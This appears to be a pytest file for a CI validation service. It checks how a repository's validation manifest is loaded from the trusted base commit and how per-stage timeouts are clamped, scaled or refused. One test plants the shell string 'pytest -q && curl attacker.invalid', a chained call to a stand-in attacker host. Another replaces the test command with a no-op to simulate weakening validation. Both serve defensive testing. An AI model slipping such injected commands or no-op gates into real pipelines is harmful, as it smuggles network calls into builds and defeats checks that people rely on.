from __future__ import annotations

import itertools
import json
import subprocess
from datetime import timedelta

import pytest
from dse_contracts import GateStatus

from dse_validation.config import (
    _MIN_STAGE_TIMEOUT_SECONDS,
    L1Config,
    L1ManifestError,
    default_scan_timeout_seconds,
    stage_budget_seconds,
    stage_timeout_ceiling_seconds,
)


def _scan_reserve() -> int:
    return sum(default_scan_timeout_seconds(name) for name in ("sast", "secret_scan"))


def _commit(repo, message: str) -> None:
    subprocess.run(["git", "add", "-A"], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-q", "-m", message], cwd=repo, check=True)


def _rewrite_manifest(git_repo, message: str, **fields) -> None:
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    payload.update(fields)
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, message)


def test_manifest_is_read_from_base_sha_not_mutable_head(
    sandbox, git_repo, git_sha
):
    base_sha = git_sha()
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    payload["commands"]["test"] = ["sh", "-c", "exit 0"]
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, "attempt to weaken validation")

    cfg = L1Config.from_trusted_manifest(sandbox, base_sha)

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.test_cmd == ["pytest", "-q"]


def test_manifest_rejects_shell_string_commands(sandbox, git_repo, git_sha):
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    payload["commands"]["test"] = "pytest -q && curl attacker.invalid"
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, "invalid manifest")

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.ERROR
    assert cfg.test_cmd == []
    assert "JSON array" in cfg.manifest_detail


def test_manifest_missing_command_remains_not_configured(sandbox, git_repo, git_sha):
    manifest = git_repo / ".dse" / "validation.json"
    payload = json.loads(manifest.read_text())
    del payload["commands"]["typecheck"]
    manifest.write_text(json.dumps(payload) + "\n")
    _commit(git_repo, "partial manifest")

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.typecheck_cmd == []


def test_legacy_scalar_governs_the_short_commands_and_floors_the_suite(sandbox, git_sha):
    """The fixture manifest is the one every repo has today: a single scalar and
    no `timeouts` block. It stays valid, and it keeps meaning exactly what it
    meant for the three short commands.

    `test` is the exception, and on purpose: one scalar cannot say "test is the
    long one", so until a repo says it in `timeouts.test` the platform will not
    run the suite on a shorter clock than the Tester already gave the very same
    suite one activity earlier."""

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.timeout_seconds == 300
    assert [cfg.timeout_for(name) for name in ("lint", "typecheck", "build")] == [300, 300, 300]
    assert cfg.timeout_for("test") == 1500
    # The two scans keep their own defaults: letting the repo's scalar govern
    # them would silently change how long they get on every existing manifest.
    assert cfg.timeout_for("sast") == 120
    assert cfg.timeout_for("secret_scan") == 60
    # And the config the platform ships still fits the activity it runs in.
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()


def test_per_stage_timeouts_override_the_scalar(sandbox, git_repo, git_sha):
    _rewrite_manifest(
        git_repo,
        "per-stage timeouts",
        timeouts={"lint": 30, "test": 700, "sast": 300},
    )

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.timeout_for("lint") == 30
    assert cfg.timeout_for("test") == 700
    assert cfg.timeout_for("sast") == 300
    # Not declared -> the scalar (commands) and the platform default (scans).
    assert cfg.timeout_for("build") == 300
    assert cfg.timeout_for("secret_scan") == 60


def test_stage_timeout_above_the_platform_ceiling_is_refused(sandbox, git_repo, git_sha):
    ceiling = stage_timeout_ceiling_seconds()
    _rewrite_manifest(git_repo, "greedy timeout", timeouts={"test": ceiling + 1})

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.ERROR
    assert "timeouts.test" in cfg.manifest_detail
    assert str(ceiling + 1) in cfg.manifest_detail
    assert f"ceiling of {ceiling}s" in cfg.manifest_detail


def test_stage_timeouts_that_do_not_fit_the_activity_are_scaled_not_refused(
    sandbox, git_repo, git_sha
):
    """This asserted REFUSAL until it cost a work item, and the reversal is
    deliberate.

    `bmo-fee-calculator-be-dse` declared 900+900+900+900+120+120 = 3840s against
    a 3330s budget. The manifest was refused whole, so every command read
    NOT_CONFIGURED and the item escalated with ZERO stages run — after the
    Tester had already passed with a real Java test. A repository asking for too
    much time got no time at all.

    "Clamped, never refused" is this module's rule for every other input (the
    scalar, the scans, the legacy cap). Declared per-stage values were the one
    exception, and `_resolve_stage_timeouts` carried a comment predicting this
    exact 3240->3840-against-3330 outage before it happened.

    Scaling is proportional, so a manifest that says "test is the long one"
    still says it."""

    ceiling = stage_timeout_ceiling_seconds()
    stages = ("lint", "typecheck", "test", "build", "sast", "secret_scan")
    _rewrite_manifest(
        git_repo, "sum over budget", timeouts={name: ceiling for name in stages}
    )

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS, cfg.manifest_detail
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    assert all(v > 0 for v in cfg.timeouts.values())
    # and it SAYS so, rather than silently running on a clock nobody asked for
    assert "scaled to fit rather than refused" in cfg.manifest_detail
    assert f"summed to {ceiling * len(stages)}s" in cfg.manifest_detail


def test_a_manifest_that_fits_is_left_exactly_as_declared(sandbox, git_repo, git_sha):
    """The scaling must not touch a manifest that was already inside the budget
    — otherwise every repository silently loses time to a fix for one that was
    not."""

    declared = {"lint": 120, "typecheck": 120, "test": 600, "build": 120}
    _rewrite_manifest(git_repo, "within budget", timeouts=declared)

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    for name, seconds in declared.items():
        assert cfg.timeouts[name] == seconds
    assert "scaled to fit" not in cfg.manifest_detail


def test_the_backend_testbeds_real_numbers_now_load(sandbox, git_repo, git_sha):
    """The exact manifest that escalated `wi_t2-53ea7c73`, verbatim."""

    _rewrite_manifest(
        git_repo,
        "bmo backend",
        timeouts={"lint": 900, "typecheck": 900, "test": 900, "build": 900,
                  "sast": 120, "secret_scan": 120},
    )

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS, cfg.manifest_detail
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    # proportional: the four commands were equal and stay equal
    assert cfg.timeouts["lint"] == cfg.timeouts["test"] == cfg.timeouts["build"]


def test_scaling_preserves_what_the_manifest_said_was_the_long_stage(
    sandbox, git_repo, git_sha
):
    """The point of scaling rather than truncating: a repository that said
    "test is the long one" must still be saying it afterwards.

    This test exists because mutation testing caught its absence — flattening
    every stage to the floor satisfied every other assertion in this file,
    including an equality check that only held because the values it compared
    were equal before AND after. A test that cannot fail when the feature is
    replaced by a constant pins nothing."""

    _rewrite_manifest(
        git_repo,
        "uneven",
        timeouts={"lint": 600, "typecheck": 600, "test": 2400, "build": 600,
                  "sast": 300, "secret_scan": 300},
    )

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS, cfg.manifest_detail
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    razao = cfg.timeouts["test"] / cfg.timeouts["lint"]
    assert 3.5 < razao < 4.5, (
        f"test was declared 4x lint and came out {razao:.2f}x — the scaling "
        f"flattened the manifest instead of shrinking it: {cfg.timeouts}"
    )
    assert cfg.timeouts["test"] > cfg.timeouts["sast"]


def test_refusal_survives_for_a_budget_that_not_even_the_floors_fit(
    sandbox, git_repo, git_sha, monkeypatch
):
    """Scaling replaced refusal as the FIRST response, not as the only one. If
    the activity is so short that six stages cannot each get the minimum, there
    is nothing honest to run and the manifest must still be refused rather than
    scaled into a clock that guarantees timeouts."""

    from dse_validation import config as cfgmod

    from dse_validation.config import _MIN_STAGE_TIMEOUT_SECONDS

    floor = _MIN_STAGE_TIMEOUT_SECONDS
    # Below six floors, so nothing can be scaled into it. Every declared value
    # is AT the floor, so the per-stage ceiling guard (which fires earlier) has
    # nothing to object to and the sum guard is what we actually exercise.
    monkeypatch.setattr(cfgmod, "stage_budget_seconds", lambda: floor * 6 - 1)
    _rewrite_manifest(
        git_repo,
        "impossible",
        timeouts={n: floor for n in
                  ("lint", "typecheck", "test", "build", "sast", "secret_scan")},
    )

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.ERROR, cfg.manifest_detail
    assert "add up to" in cfg.manifest_detail


def test_scalar_above_what_the_activity_has_is_clamped_not_refused(sandbox, git_repo, git_sha):
    """`timeout_seconds: 3000` is valid today. Refusing it would escalate a work
    item over a manifest nobody changed.

    The scalar asks for the SAME number four times over, so what clamps it is
    its own share of the budget — not the per-stage ceiling, which exists for a
    single stage and is far higher."""

    _rewrite_manifest(git_repo, "scalar above the ceiling", timeout_seconds=3000)

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.timeout_seconds < stage_timeout_ceiling_seconds()
    assert cfg.timeout_for("lint") == cfg.timeout_seconds
    # And the clamped scalar does not drag the suite down with it.
    assert cfg.timeout_for("test") > cfg.timeout_seconds
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    assert "clamped" in cfg.manifest_detail
    assert "3000" in cfg.manifest_detail


def test_unknown_timeout_stage_is_refused(sandbox, git_repo, git_sha):
    _rewrite_manifest(git_repo, "unknown stage", timeouts={"deploy": 60})

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.ERROR
    assert "unknown timeouts: ['deploy']" in cfg.manifest_detail


def test_raising_a_platform_scan_timeout_cannot_escalate_an_untouched_manifest(
    sandbox, git_repo, git_sha, monkeypatch
):
    """`DSE_L1_SAST_TIMEOUT_SECONDS` is a PLATFORM knob. If the budget guard
    reserved the shipped 120+60 while the scans resolved to the configured
    value, raising it pushed the resolved sum past the budget and every
    repository's untouched manifest became an ERROR — a platform setting
    escalating somebody else's work item."""
    monkeypatch.setenv("DSE_L1_SAST_TIMEOUT_SECONDS", "600")
    _rewrite_manifest(git_repo, "legacy scalar at the old maximum", timeout_seconds=3600)

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    assert cfg.timeout_for("sast") == 600


def test_two_platform_knobs_together_still_cannot_escalate_an_untouched_manifest(
    sandbox, git_repo, git_sha, monkeypatch
):
    """The previous test moves ONE knob. The ceiling is a knob too, and it is
    the one that disarms the other: `_legacy_command_cap` shrinks with the RAW
    scan reserve, while the resolved scans were bounded only by the ceiling —
    so an operator who raised both pushed the resolved sum past the budget from
    a manifest nobody had touched, and the guard blamed the repository for a
    ConfigMap. Every stage the resolved config asks for has to fit."""
    monkeypatch.setenv("DSE_L1_SAST_TIMEOUT_SECONDS", "3000")
    monkeypatch.setenv("DSE_L1_TIMEOUT_CEILING_SECONDS", "3000")
    monkeypatch.setenv("DSE_ACTIVITY_START_TO_CLOSE_SECONDS", "600.0")
    _rewrite_manifest(git_repo, "legacy scalar, untouched", timeout_seconds=900)

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()


def test_the_budget_leaves_the_activity_room_to_finish_after_the_last_stage(monkeypatch):
    """The stages are not the whole activity: the `validation_runs` insert, the
    audit row and encoding the result all happen after the last one returns. A
    budget equal to start_to_close minus the git execs is a TIE — the server
    kills the activity, no L1Result comes back, and the turn retries from zero."""
    monkeypatch.setenv("DSE_ACTIVITY_START_TO_CLOSE_SECONDS", "3600.0")
    from dse_validation.config import _PIPELINE_FIXED_COST_SECONDS

    assert stage_budget_seconds() + _PIPELINE_FIXED_COST_SECONDS < 3600


def test_the_budget_follows_the_clock_the_workflow_actually_scheduled(monkeypatch):
    """`start_to_close` lives in the WORKFLOW's input; the env var is only this
    worker's copy of it. Reading the env when a real activity context says
    otherwise is two clocks for one deadline — and the permissive direction
    (env high, real clock low) admits manifests the activity cannot finish."""
    import dataclasses

    from temporalio.testing import ActivityEnvironment

    from dse_validation.config import _activity_start_to_close_seconds

    monkeypatch.setenv("DSE_ACTIVITY_START_TO_CLOSE_SECONDS", "3600.0")
    env = ActivityEnvironment()
    env.info = dataclasses.replace(env.info, start_to_close_timeout=timedelta(seconds=1800))

    assert _activity_start_to_close_seconds() == 3600  # no context -> the env
    assert env.run(_activity_start_to_close_seconds) == 1800
    assert env.run(stage_budget_seconds) < stage_budget_seconds()


def test_an_uneven_distribution_that_fits_the_activity_is_accepted(sandbox, git_repo, git_sha):
    """The distribution the exit criterion is written in: one long suite and
    three short commands. It fits with room to spare — and an equal division of
    the budget between the four commands made it inexpressible, refusing it one
    stage at a time without ever looking at the sum."""

    _rewrite_manifest(git_repo, "long suite, short everything else", timeouts={"test": 900})

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS
    assert cfg.timeout_for("test") == 900
    assert [cfg.timeout_for(name) for name in ("lint", "typecheck", "build")] == [300, 300, 300]
    assert sum(cfg.timeouts.values()) == 900 + 3 * 300 + _scan_reserve()
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    # What used to make it impossible: an equal quarter of the same budget,
    # smaller than the suite the criterion asks for while the sum was never the
    # problem.
    even_share = (stage_budget_seconds() - _scan_reserve()) // 4
    assert even_share < 900 < stage_timeout_ceiling_seconds()


def test_the_exit_criterion_suite_runs_to_the_end_on_an_untouched_manifest(sandbox, git_sha):
    """A5/A8 ask for a real suite of 10 to 15 minutes on 1 vCPU running to the
    end and producing a real PASS/FAIL. The manifest every repo already has — a
    single scalar, no `timeouts` — must not be what stops it."""

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.timeout_for("test") > 15 * 60
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()


def test_l1_never_cuts_a_suite_the_tester_already_let_run(sandbox, git_sha):
    """The two services put a clock on the SAME suite, one after the other, and
    only the tighter of the two is ever observed. It has to be the Tester's: an
    overrun there is `suite_hung`, named for what was measured and worth one
    Coder turn; the same overrun here is a `test` finding with status ERROR,
    which buys up to three paid Coder turns hunting an assert that never failed.

    Strictly greater, not equal: L1 runs the suite a SECOND time, so a tie is
    decided by whichever run happens to be slower."""

    activities = pytest.importorskip("sandbox_runtime.activities")
    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.timeout_for("test") > activities._DEFAULT_SUITE_TIMEOUT_SECONDS


def test_four_commands_at_the_ceiling_are_scaled_with_readable_numbers(
    sandbox, git_repo, git_sha
):
    """The ceiling bounds ONE stage; nothing about it says four of them fit.
    What no longer happens is a refusal — see
    `test_stage_timeouts_that_do_not_fit_the_activity_are_scaled_not_refused`.
    The message still has to carry the three numbers a human needs: what was
    asked for, what it added up to, and what there was."""

    ceiling = stage_timeout_ceiling_seconds()
    commands = ("lint", "typecheck", "test", "build")
    _rewrite_manifest(git_repo, "four maxima", timeouts={name: ceiling for name in commands})

    cfg = L1Config.from_trusted_manifest(sandbox, git_sha())

    assert cfg.manifest_status == GateStatus.PASS, cfg.manifest_detail
    assert sum(cfg.timeouts.values()) <= stage_budget_seconds()
    # the three numbers a human needs to understand what happened to their
    # manifest, now describing a SCALING instead of a rejection
    assert f"summed to {4 * ceiling + _scan_reserve()}s" in cfg.manifest_detail
    assert f"over the {stage_budget_seconds()}s" in cfg.manifest_detail
    assert "scaled to fit rather than refused" in cfg.manifest_detail


def test_a_scalar_only_manifest_is_never_refused_whatever_the_platform_is_set_to(monkeypatch):
    """The invariant the whole clamping path exists for: no combination of
    PLATFORM settings may turn a manifest nobody touched into an escalated work
    item. The scalar is clamped, `test` is floored, the scans are bounded — and
    the resolved sum still has to fit the activity that runs them.

    "Not refused" is only half of it, and the cheaper half. A scan reserve wide
    enough (sast=3000 against a 600 s start_to_close) used to clamp the scalar to
    ONE SECOND: the manifest loaded PASS and then lint, typecheck and build all
    timed out — three findings with status ERROR, `coder_retry_count += 1`, up to
    three paid Coder turns. Same escalation, different door. So every stage the
    resolved config asks for also has to be a budget somebody could meet."""

    payload = {
        "version": 1,
        "commands": {
            "lint": ["ruff"],
            "typecheck": ["mypy"],
            "test": ["pytest"],
            "build": ["make"],
        },
        "sast_severity_gate": "MEDIUM",
    }
    for start_to_close, sast, ceiling, scalar in itertools.product(
        ("600.0", "1800.0", "3600.0", "7200.0"),
        ("60", "600", "3000"),
        ("60", "900", "3000"),
        (1, 300, 900, 3600),
    ):
        monkeypatch.setenv("DSE_ACTIVITY_START_TO_CLOSE_SECONDS", start_to_close)
        monkeypatch.setenv("DSE_L1_SAST_TIMEOUT_SECONDS", sast)
        monkeypatch.setenv("DSE_L1_TIMEOUT_CEILING_SECONDS", ceiling)
        combination = (
            f"start_to_close={start_to_close} sast={sast} ceiling={ceiling} scalar={scalar}"
        )
        try:
            cfg = L1Config._from_manifest_payload(
                {**payload, "timeout_seconds": scalar}, source=combination
            )
        except L1ManifestError as exc:
            raise AssertionError(f"refused an untouched manifest: {exc.detail}") from exc
        assert sum(cfg.timeouts.values()) <= stage_budget_seconds(), combination
        # Against what the REPOSITORY asked for, floored: a repo that writes
        # `timeout_seconds: 1` gets 1 and owns the consequence. What may never
        # happen is the PLATFORM taking a workable scalar there.
        floor = min(scalar, _MIN_STAGE_TIMEOUT_SECONDS)
        for name in ("lint", "typecheck", "test", "build"):
            assert cfg.timeout_for(name) >= floor, (
                f"{combination}: {name} resolved to {cfg.timeout_for(name)}s — a stage "
                "scheduled to ERROR is the escalation this clamp exists to prevent"
            )
